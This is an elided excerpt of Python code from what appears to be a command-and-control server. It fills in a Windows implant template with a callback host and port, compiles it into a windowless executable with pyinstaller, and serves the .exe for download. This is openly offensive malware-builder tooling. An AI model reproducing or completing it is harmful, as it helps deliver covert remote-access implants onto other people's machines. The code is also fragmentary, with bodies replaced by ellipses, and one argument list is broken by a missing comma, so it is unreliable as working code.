...
def compile_request(implant: Implant):
    ...
    if comp_ret == 0:
        ...
        return FileResponse(path=filepath, filename=f'{filename}.exe', media_type='application/octet-stream')
...
def modify_template(filename, localhost, localport):
    ...
    with open('C:\\workspace\\command_and_control\\windows_template.py', 'r') as srcfile:

        content = srcfile.read()

        with open(f'C:\\workspace\\command_and_control\\{filename}.py', 'w') as dstfile:
...
def compile_implant(localhost, localport, filename):
    ...
    compilation = subprocess.run(['pyinstaller', '--onefile', '--distpath', 'C:\\workspace\\implants\\windows\\implants', '--workpath', 'C:\\workspace\\implants\\windows\\workfolder', '--noconsole' '--name', filename, f'C:\\workspace\\command_and_control\\{filename}.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
...
def get_file_path(filename):
    ...
    return f'C:\\workspace\\implants\\windows\\implants\\{filename}.exe'


def delete_custom_template(filename):

    if os.path.exists(f"C:\\workspace\\command_and_control\\{filename}.py"):

        os.remove(f"C:\\workspace\\command_and_control\\{filename}.py")
